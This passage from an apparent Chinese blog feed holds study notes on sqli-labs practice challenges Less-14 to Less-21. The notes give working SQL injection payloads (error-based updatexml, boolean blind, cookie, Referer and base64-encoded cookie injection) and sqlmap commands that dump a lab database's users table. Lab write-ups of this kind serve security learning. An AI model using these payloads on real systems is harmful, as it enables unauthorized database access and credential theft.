operator">=</span>YWRtaW4nKSB1bmlvbiBzZWxlY3QgMSwyLHVwZGF0ZXhtbCgxLGNvbmNhdCgweDdlLChzZWxlY3QgZ3JvdXBfY29uY2F0KHRhYmxlX25hbWUpIGZyb20gaW5mb3JtYXRpb25fc2NoZW1hLnRhYmxlcyB3aGVyZSB0YWJsZV9zY2hlbWEgPSBkYXRhYmFzZSgpKSwweDdlKSwxKS0tICs<span class="token operator">=</span>爆破字段名<span class="token assign-left variable">uname</span><span class="token operator">=</span>admin<span class="token string">') union select 1,2,updatexml(1,concat(0x7e,(select (column_name) from information_schema.columns where table_name='</span><span class="token function">users</span><span class="token string">' limit 8,1),0x7e),1)-- +uname=YWRtaW4nKSB1bmlvbiBzZWxlY3QgMSwyLHVwZGF0ZXhtbCgxLGNvbmNhdCgweDdlLChzZWxlY3QgKGNvbHVtbl9uYW1lKSBmcm9tIGluZm9ybWF0aW9uX3NjaGVtYS5jb2x1bW5zIHdoZXJlIHRhYmxlX25hbWU9J3VzZXJzJyBsaW1pdCA4LDEpLDB4N2UpLDEpLS0gKw==爆破字段uname=admin'</span><span class="token punctuation">)</span> union <span class="token keyword">select</span> <span class="token number">1,2</span>,updatexml<span class="token punctuation">(</span><span class="token number">1</span>,concat<span class="token punctuation">(</span>0x7e,<span class="token punctuation">(</span>select username from <span class="token function">users</span> limit <span class="token number">0,1</span><span class="token punctuation">)</span>,0x7e<span class="token punctuation">)</span>,1<span class="token punctuation">)</span>-- +<span class="token assign-left variable">uname</span><span class="token operator">=</span>YWRtaW4nKSB1bmlvbiBzZWxlY3QgMSwyLHVwZGF0ZXhtbCgxLGNvbmNhdCgweDdlLChzZWxlY3QgdXNlcm5hbWUgZnJvbSB1c2VycyBsaW1pdCAwLDEpLDB4N2UpLDEpLS0gKw<span class="token operator">==</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><a name="ImHDK"></a></p><h1 id="sqlmap加密注入运用"><a href="#sqlmap加密注入运用" class="headerlink" title="sqlmap加密注入运用"></a>sqlmap加密注入运用</h1><p>将数据包头的内容重新粘贴到新的文档中，<br>在Cookie处标上*&amp;#x20;<br>启动sqlmap,对进行加密注入的数据需要用到tamper模块</p><blockquote><p><strong>–tamper=”base64encode.py”</strong></p></blockquote><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">GET /less-21/index.php HTTP/1.1Host: <span class="token number">192.168</span>.31.193Upgrade-Insecure-Requests: <span class="token number">1</span>User-Agent: Mozilla/5.0 <span class="token punctuation">(</span>Windows NT <span class="token number">10.0</span><span class="token punctuation">;</span> Win64<span class="token punctuation">;</span> x64<span class="token punctuation">)</span> AppleWebKit/537.36 <span class="token punctuation">(</span>KHTML, like Gecko<span class="token punctuation">)</span> Chrome/101.0.0.0 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml<span class="token punctuation">;</span><span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">0.9</span>,image/avif,image/webp,image/apng,*/*<span class="token punctuation">;</span><span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">0.8</span>,application/signed-exchange<span class="token punctuation">;</span><span class="token assign-left variable">v</span><span class="token operator">=</span>b3<span class="token punctuation">;</span><span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">0.9</span>Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh<span class="token punctuation">;</span><span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">0.9</span>Cookie: <span class="token assign-left variable">uname</span><span class="token operator">=</span>YWRtaW4%3D*Connection: close<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">扫描sqlmap <span class="token parameter variable">-r</span> <span class="token number">3</span>.txt <span class="token parameter variable">--batch</span> <span class="token parameter variable">--level</span> <span class="token number">3</span> <span class="token parameter variable">--tamper</span><span class="token operator">=</span><span class="token string">"base64encode.py"</span>爆破数据库sqlmap <span class="token parameter variable">-r</span> <span class="token number">3</span>.txt <span class="token parameter variable">--batch</span> <span class="token parameter variable">--level</span> <span class="token number">3</span> <span class="token parameter variable">--tamper</span><span class="token operator">=</span><span class="token string">"base64encode.py"</span> --current-db爆破表单sqlmap <span class="token parameter variable">-r</span> <span class="token number">3</span>.txt <span class="token parameter variable">--batch</span> <span class="token parameter variable">--level</span> <span class="token number">3</span> <span class="token parameter variable">--tamper</span><span class="token operator">=</span><span class="token string">"base64encode.py"</span> <span class="token parameter variable">-D</span> security <span class="token parameter variable">--tables</span>脱库sqlmap <span class="token parameter variable">-r</span> <span class="token number">3</span>.txt <span class="token parameter variable">--batch</span> <span class="token parameter variable">--level</span> <span class="token number">3</span> <span class="token parameter variable">--tamper</span><span class="token operator">=</span><span class="token string">"base64encode.py"</span> <span class="token parameter variable">-D</span> security <span class="token parameter variable">-T</span> <span class="token function">users</span> <span class="token parameter variable">--dump</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>less20</title>
      <link href="/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/basic-challenges/less18/less20/"/>
      <url>/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/basic-challenges/less18/less20/</url>
      
        <content type="html"><![CDATA[<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$sql</span><span class="token operator">=</span><span class="token string">"SELECT  users.username, users.password FROM users WHERE users.username=<span class="token variable">$uname</span> and users.password=<span class="token variable">$passwd</span> ORDER BY users.id DESC LIMIT 0,1"</span><span class="token punctuation">;</span><span class="token variable">$sql</span><span class="token operator">=</span><span class="token string">"SELECT * FROM users WHERE username='<span class="token variable">$cookee</span>' LIMIT 0,1"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>登录之后发现有很明显的<strong>cookie</strong>提示</p><blockquote><p>YOUR USER AGENT IS : Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.0.0 Safari/537.36<br>YOUR IP ADDRESS IS : 192.168.31.119<br>DELETE YOUR COOKIE OR WAIT FOR IT TO EXPIRE<br>YOUR COOKIE : uname = admin and expires: Wed 16 Nov 2022 - 19:23:44<br>Your Login name:admin<br>Your Password:admin<br>Your ID:8</p></blockquote><p>登录之后刷新页面，一定要保证cookie还在存在的前提下进行抓包 &amp;#x20;<br><code>uname = admin' order by 3-- +</code><br><code>uname=admin' order by 4-- +</code></p><blockquote><p>Issue with your mysql: Unknown column ‘4’ in ‘order clause’</p></blockquote><p>3个字段数 <a name="NTGzZ"></a></p><h1 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h1><p><a name="X6iZN"></a></p><h2 id="爆破数据库名"><a href="#爆破数据库名" class="headerlink" title="爆破数据库名"></a>爆破数据库名</h2><p><code>uname=admin' union select 1,2,updatexml(1,concat(0x7e,database(),0x7e),1)--+</code> <a name="DoliG"></a></p><h2 id="爆破数据表名"><a href="#爆破数据表名" class="headerlink" title="爆破数据表名"></a>爆破数据表名</h2><p><code>uname=admin' union select 1,2,updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema = database()),0x7e),1)--+</code> <a name="zblHG"></a></p><h2 id="爆破字段名"><a href="#爆破字段名" class="headerlink" title="爆破字段名"></a>爆破字段名</h2><p><code>uname=admin' union select 1,2,updatexml(1,concat(0x7e,(select (column_name) from information_schema.columns where table_name='users' limit 8,1),0x7e),1)-- +</code> <a name="IHMXL"></a></p><h2 id="爆破字段"><a href="#爆破字段" class="headerlink" title="爆破字段"></a>爆破字段</h2><p><code>uname=admin' union select 1,2,updatexml(1,concat(0x7e,(select username from users limit 0,1),0x7e),1)-- +</code></p><p><a name="Ea4Mq"></a></p><h1 id="sqlmap-cookie注入"><a href="#sqlmap-cookie注入" class="headerlink" title="sqlmap cookie注入"></a>sqlmap cookie注入</h1><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">POST /less-20/index.php HTTP/1.1Host: <span class="token number">192.168</span>.31.193Content-Length: <span class="token number">0</span>Cache-Control: max-age<span class="token operator">=</span><span class="token number">0</span>Upgrade-Insecure-Requests: <span class="token number">1</span>User-Agent: Mozilla/5.0 <span class="token punctuation">(</span>Windows NT <span class="token number">10.0</span><span class="token punctuation">;</span> Win64<span class="token punctuation">;</span> x64<span class="token punctuation">)</span> AppleWebKit/537.36 <span class="token punctuation">(</span>KHTML, like Gecko<span class="token punctuation">)</span> Chrome/101.0.0.0 Safari/537.36Origin: http://192.168.31.193Content-Type: application/x-www-form-urlencodedAccept: text/html,application/xhtml+xml,application/xml<span class="token punctuation">;</span><span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">0.9</span>,image/avif,image/webp,image/apng,*/*<span class="token punctuation">;</span><span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">0.8</span>,application/signed-exchange<span class="token punctuation">;</span><span class="token assign-left variable">v</span><span class="token operator">=</span>b3<span class="token punctuation">;</span><span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">0.9</span>Referer: http://192.168.31.193/less-20/index.phpAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh<span class="token punctuation">;</span><span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">0.9</span>Cookie: <span class="token assign-left variable">uname</span><span class="token operator">=</span>admin*Connection: close<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>打上*  level 等级2</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">检测注入点sqlmap <span class="token parameter variable">-r</span> <span class="token number">3</span>.txt <span class="token parameter variable">--batch</span> <span class="token parameter variable">--level</span> <span class="token number">2</span>爆破数据库名sqlmap <span class="token parameter variable">-r</span> <span class="token number">3</span>.txt <span class="token parameter variable">--batch</span> <span class="token parameter variable">--level</span> <span class="token number">2</span> --current-db爆破数据表名sqlmap <span class="token parameter variable">-r</span> <span class="token number">3</span>.txt <span class="token parameter variable">--batch</span> <span class="token parameter variable">--level</span> <span class="token number">2</span> <span class="token parameter variable">-D</span> <span class="token string">"security"</span> <span class="token parameter variable">--tables</span>爆破字段内容sqlmap <span class="token parameter variable">-r</span> <span class="token number">3</span>.txt <span class="token parameter variable">--batch</span> <span class="token parameter variable">--level</span> <span class="token number">2</span> <span class="token parameter variable">-D</span> <span class="token string">"security"</span> <span class="token parameter variable">-T</span> <span class="token string">"users"</span> <span class="token parameter variable">--dump</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>less19</title>
      <link href="/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/basic-challenges/less18/less19/"/>
      <url>/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/basic-challenges/less18/less19/</url>
      
        <content type="html"><![CDATA[<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$sql</span><span class="token operator">=</span><span class="token string">"SELECT  users.username, users.password FROM users WHERE users.username=<span class="token variable">$uname</span> and users.password=<span class="token variable">$passwd</span> ORDER BY users.id DESC LIMIT 0,1"</span><span class="token punctuation">;</span><span class="token variable">$result1</span> <span class="token operator">=</span> mysql_query<span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$row1</span> <span class="token operator">=</span> mysql_fetch_array<span class="token punctuation">(</span><span class="token variable">$result1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>if<span class="token punctuation">(</span><span class="token variable">$row1</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token builtin class-name">echo</span> <span class="token string">'&lt;font color= "#FFFF00" font size = 3 &gt;'</span><span class="token punctuation">;</span><span class="token variable">$insert</span><span class="token operator">=</span><span class="token string">"INSERT INTO <span class="token variable"><span class="token variable">`</span>security<span class="token variable">`</span></span>.<span class="token variable"><span class="token variable">`</span>referers<span class="token variable">`</span></span> (<span class="token variable"><span class="token variable">`</span>referer<span class="token variable">`</span></span>, <span class="token variable"><span class="token variable">`</span>ip_address<span class="token variable">`</span></span>) VALUES ('<span class="token variable">$uagent</span>', '<span class="token variable">$IP</span>')"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>成功登录后返回referer位置，说明在<strong>数据包头referer位置有</strong>注入点</p><blockquote><p>Your IP ADDRESS is: 192.168.31.119<br>Your <strong>Referer</strong> is: <a href="http://192.168.31.193/Less-19/">http://192.168.31.193/Less-19/</a></p></blockquote><p><a name="NTGzZ"></a></p><h1 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h1><p><a name="X6iZN"></a></p><h2 id="爆破数据库名"><a href="#爆破数据库名" class="headerlink" title="爆破数据库名"></a>爆破数据库名</h2><p><code>1',updatexml(1,concat(0x7e,database(),0x7e),1))#</code></p><blockquote><p>Your IP ADDRESS is: 192.168.31.119<br>Your Referer is: 1’,updatexml(1,concat(0x7e,database(),0x7e),1))#<br>XPATH syntax error: ‘<del>security</del>‘</p></blockquote><p><a name="hycyr"></a></p><h2 id="爆破数据表名"><a href="#爆破数据表名" class="headerlink" title="爆破数据表名"></a>爆破数据表名</h2><p><code>1',updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema = database()),0x7e),1))#</code> <a name="zblHG"></a></p><h2 id="爆破字段名"><a href="#爆破字段名" class="headerlink" title="爆破字段名"></a>爆破字段名</h2><p><code>1', updatexml(1,concat(0x7e,(select (column_name) from information_schema.columns where table_name='users' limit 8,1),0x7e),1)) -- +</code> <a name="IHMXL"></a></p><h2 id="爆破字段"><a href="#爆破字段" class="headerlink" title="爆破字段"></a>爆破字段</h2><p><code>1', updatexml(1,concat(0x7e,(select username from users limit 0,1),0x7e),1)) -- +</code> <a name="gX5ct"></a></p><h1 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h1><p>将数据包保存后 在referer后面加上*即可</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">POST /Less-19/ HTTP/1.1Host: <span class="token number">192.168</span>.31.193Content-Length: <span class="token number">24</span>Cache-Control: max-age<span class="token operator">=</span><span class="token number">0</span>Upgrade-Insecure-Requests: <span class="token number">1</span>Origin: http://192.168.31.193Content-Type: application/x-www-form-urlencodedUser-Agent: Mozilla/5.0 <span class="token punctuation">(</span>Windows NT <span class="token number">10.0</span><span class="token punctuation">;</span> Win64<span class="token punctuation">;</span> x64<span class="token punctuation">)</span> AppleWebKit/537.36 <span class="token punctuation">(</span>KHTML, like Gecko<span class="token punctuation">)</span> Chrome/101.0.0.0 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml<span class="token punctuation">;</span><span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">0.9</span>,image/avif,image/webp,image/apng,*/*<span class="token punctuation">;</span><span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">0.8</span>,application/signed-exchange<span class="token punctuation">;</span><span class="token assign-left variable">v</span><span class="token operator">=</span>b3<span class="token punctuation">;</span><span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">0.9</span>Referer: http://192.168.31.193/Less-19/*Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh<span class="token punctuation">;</span><span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">0.9</span>Connection: close<span class="token assign-left variable">passwd</span><span class="token operator">=</span>admin<span class="token operator">&amp;</span><span class="token assign-left variable">uname</span><span class="token operator">=</span>admin<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">检测注入点sqlmap <span class="token parameter variable">-r</span> <span class="token number">2</span>.txt <span class="token parameter variable">--batch</span> <span class="token parameter variable">--level</span> <span class="token number">4</span>爆破数据库名sqlmap <span class="token parameter variable">-r</span> <span class="token number">2</span>.txt <span class="token parameter variable">--batch</span> <span class="token parameter variable">--level</span> <span class="token number">4</span> --current-db爆破数据表名sqlmap <span class="token parameter variable">-r</span> <span class="token number">2</span>.txt <span class="token parameter variable">--batch</span> <span class="token parameter variable">--level</span> <span class="token number">4</span> <span class="token parameter variable">-D</span> <span class="token string">"security"</span> <span class="token parameter variable">--tables</span>爆破字段内容sqlmap <span class="token parameter variable">-r</span> <span class="token number">2</span>.txt <span class="token parameter variable">--batch</span> <span class="token parameter variable">--level</span> <span class="token number">4</span> <span class="token parameter variable">-D</span> <span class="token string">"security"</span> <span class="token parameter variable">-T</span> <span class="token string">"users"</span> <span class="token parameter variable">--dump</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>less17</title>
      <link href="/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/basic-challenges/less15/less17/"/>
      <url>/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/basic-challenges/less15/less17/</url>
      
        <content type="html"><![CDATA[<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">@<span class="token variable">$sql</span><span class="token operator">=</span><span class="token string">"SELECT username, password FROM users WHERE username= <span class="token variable">$uname</span> LIMIT 0,1"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><code>uname=1'</code></p><blockquote><p>[PASSWORD RESET]</p></blockquote><p>提示密码重设置,<br>&amp;#x20;<strong>注入点是密码的位置</strong> <a name="irTrU"></a></p><h1 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h1><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">查询数据库表<span class="token assign-left variable">passwd</span><span class="token operator">=</span>admin<span class="token string">' and updatexml(1,concat(0x7e,(select database()),0x7e),1)-- +爆破数据表passwd=1'</span> and updatexml<span class="token punctuation">(</span><span class="token number">1</span>,concat<span class="token punctuation">(</span>0x7e,<span class="token punctuation">(</span>select group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> from information_schema.tables where <span class="token assign-left variable">table_schema</span><span class="token operator">=</span>database<span class="token punctuation">(</span><span class="token punctuation">))</span>,0x7e<span class="token punctuation">)</span>,1<span class="token punctuation">)</span> -- +爆破字段名<span class="token assign-left variable">passwd</span><span class="token operator">=</span><span class="token number">1</span><span class="token string">' and updatexml(1,concat(0x7e,(select (column_name) from information_schema.columns where table_name='</span><span class="token function">users</span><span class="token string">' limit 8,1),0x7e),1) -- +爆破字段passwd=1'</span> and updatexml<span class="token punctuation">(</span><span class="token number">1</span>,concat<span class="token punctuation">(</span>0x7e,<span class="token punctuation">(</span>select username from <span class="token function">users</span> limit <span class="token number">0,1</span><span class="token punctuation">)</span>,0x7e<span class="token punctuation">)</span>,1<span class="token punctuation">)</span> -- +<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>less16</title>
      <link href="/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/basic-challenges/less15/less16/"/>
      <url>/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/basic-challenges/less15/less16/</url>
      
        <content type="html"><![CDATA[<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$uname</span><span class="token operator">=</span><span class="token string">'"'</span><span class="token builtin class-name">.</span><span class="token variable">$uname</span><span class="token builtin class-name">.</span><span class="token string">'"'</span><span class="token punctuation">;</span><span class="token variable">$passwd</span><span class="token operator">=</span><span class="token string">'"'</span><span class="token builtin class-name">.</span><span class="token variable">$passwd</span><span class="token builtin class-name">.</span><span class="token string">'"'</span><span class="token punctuation">;</span> @<span class="token variable">$sql</span><span class="token operator">=</span><span class="token string">"SELECT username, password FROM users WHERE username=(<span class="token variable">$uname</span>) and password=(<span class="token variable">$passwd</span>) LIMIT 0,1"</span><span class="token punctuation">;</span><span class="token variable">$result</span><span class="token operator">=</span>mysql_query<span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>在Less15的原题上将闭合方式变成了”) <a name="OMlVf"></a></p><h1 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h1><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">判断数据库名称长度admin<span class="token string">") or length(database())=8--+显示蓝色图片，说明数据库长度为8逐一猜解数据库名称admin"</span><span class="token punctuation">)</span> or ascii<span class="token punctuation">(</span>substr<span class="token punctuation">(</span>database<span class="token punctuation">(</span><span class="token punctuation">)</span>,1,1<span class="token punctuation">))</span><span class="token operator">=</span><span class="token number">115</span>--+第一个字符是s  <span class="token punctuation">..</span>.猜解数据表名称admin<span class="token string">") or ascii(mid<span class="token variable"><span class="token punctuation">((</span>select group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> from information_schema.tables where table_schema<span class="token operator">=</span>database<span class="token punctuation">(</span><span class="token punctuation">))</span></span>,1,1))&gt;101 --+第一个字符是e ...猜解字段名称admin"</span><span class="token punctuation">)</span> or ascii<span class="token punctuation">(</span>mid<span class="token variable"><span class="token punctuation">((</span>select group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span> from information_schema.columns where table_schema<span class="token operator">=</span>database<span class="token punctuation">(</span><span class="token punctuation">)</span> and table_name<span class="token operator">=</span>'users'<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">))</span></span><span class="token operator">=</span><span class="token number">105</span>--+第一个字符是i <span class="token punctuation">..</span>.猜解字段内容admin"<span class="token punctuation">)</span> or ascii<span class="token punctuation">(</span>mid<span class="token variable"><span class="token punctuation">((</span>select group_concat<span class="token punctuation">(</span>username<span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">,</span>password<span class="token punctuation">)</span> from users<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">))</span></span><span class="token operator">=</span><span class="token number">68</span>--+第一个字符是D <span class="token punctuation">..</span>.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><a name="sVerI"></a></p><h1 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h1><p><a name="OwLMd"></a></p><h2 id="burpsuite抓包"><a href="#burpsuite抓包" class="headerlink" title="burpsuite抓包"></a>burpsuite抓包</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">POST /Less-16/ HTTP/1.1Host: <span class="token number">192.168</span>.31.193Content-Length: <span class="token number">24</span>Cache-Control: max-age<span class="token operator">=</span><span class="token number">0</span>Upgrade-Insecure-Requests: <span class="token number">1</span>Origin: http://192.168.31.193Content-Type: application/x-www-form-urlencodedUser-Agent: Mozilla/5.0 <span class="token punctuation">(</span>Windows NT <span class="token number">10.0</span><span class="token punctuation">;</span> Win64<span class="token punctuation">;</span> x64<span class="token punctuation">)</span> AppleWebKit/537.36 <span class="token punctuation">(</span>KHTML, like Gecko<span class="token punctuation">)</span> Chrome/101.0.0.0 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml<span class="token punctuation">;</span><span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">0.9</span>,image/avif,image/webp,image/apng,*/*<span class="token punctuation">;</span><span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">0.8</span>,application/signed-exchange<span class="token punctuation">;</span><span class="token assign-left variable">v</span><span class="token operator">=</span>b3<span class="token punctuation">;</span><span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">0.9</span>Referer: http://192.168.31.193/Less-16/Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh<span class="token punctuation">;</span><span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">0.9</span>Connection: close<span class="token assign-left variable">passwd</span><span class="token operator">=</span>admin<span class="token operator">&amp;</span><span class="token assign-left variable">uname</span><span class="token operator">=</span>admin<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sqlmap <span class="token parameter variable">-r</span> <span class="token number">1</span>.txt <span class="token parameter variable">-p</span> <span class="token string">'uname'</span> <span class="token parameter variable">--level</span> <span class="token number">2</span> <span class="token parameter variable">--batch</span>爆破数据库sqlmap <span class="token parameter variable">-r</span> <span class="token number">1</span>.txt <span class="token parameter variable">-p</span> <span class="token string">'uname'</span> <span class="token parameter variable">--level</span> <span class="token number">2</span> <span class="token parameter variable">--batch</span> --current-db爆破表sqlmap <span class="token parameter variable">-r</span> <span class="token number">1</span>.txt <span class="token parameter variable">-p</span> <span class="token string">'uname'</span> <span class="token parameter variable">--level</span> <span class="token number">2</span> <span class="token parameter variable">--batch</span> <span class="token parameter variable">-D</span> security <span class="token parameter variable">--tables</span>脱库sqlmap <span class="token parameter variable">-r</span> <span class="token number">1</span>.txt <span class="token parameter variable">-p</span> <span class="token string">'uname'</span> <span class="token parameter variable">--level</span> <span class="token number">2</span> <span class="token parameter variable">--batch</span> <span class="token parameter variable">-D</span> security <span class="token parameter variable">--dump</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>less14</title>
      <link href="/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/basic-challenges/less11/less14/"/>
      <url>/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/basic-challenges/less11/less14/</url>
      
        <content type="html"><![CDATA[<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$uname</span><span class="token operator">=</span><span class="token string">'"'</span><span class="token builtin class-name">.</span><span class="token variable">$uname</span><span class="token builtin class-name">.</span><span class="token string">'"'</span><span class="token punctuation">;</span><span class="token variable">$passwd</span><span class="token operator">=</span><span class="token string">'"'</span><span class="token builtin class-name">.</span><span class="token variable">$passwd</span><span class="token builtin class-name">.</span><span class="token string">'"'</span><span class="token punctuation">;</span> @<span class="token variable">$sql</span><span class="token operator">=</span><span class="token string">"SELECT username, password FROM users WHERE username=<span class="token variable">$uname</span> and password=<span class="token variable">$passwd</span> LIMIT 0,1"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>与Less12的区别闭合方式为**” **&amp;#x20;<br><code>1"</code></p><blockquote><p>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘“1”” and password=”” LIMIT 0,1’ at line 1</p></blockquote><p>继续使用updataxml()函数</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">查询数据库表-1<span class="token string">" or updatexml(1,concat(0x7e,(select database()),0x7e),1) -- +爆破数据表-1"</span> or updatexml<span class="token punctuation">(</span><span class="token number">1</span>,concat<span class="token punctuation">(</span>0x7e,<span class="token punctuation">(</span>select group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span>from information_schema.tables where <span class="token assign-left variable">table_schema</span><span class="token operator">=</span>database<span class="token punctuation">(</span><span class="token punctuation">)</span> limit <span class="token number">2,1</span><span class="token punctuation">)</span>,0x7e<span class="token punctuation">)</span>,1<span class="token punctuation">)</span> -- +爆破字段名-1<span class="token string">" or updatexml(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_name='users' limit 8,1),0x7e),1) -- +爆破字段-1"</span> or updatexml<span class="token punctuation">(</span><span class="token number">1</span>,concat<span class="token punctuation">(</span>0x7e,<span class="token punctuation">(</span>select group_concat<span class="token 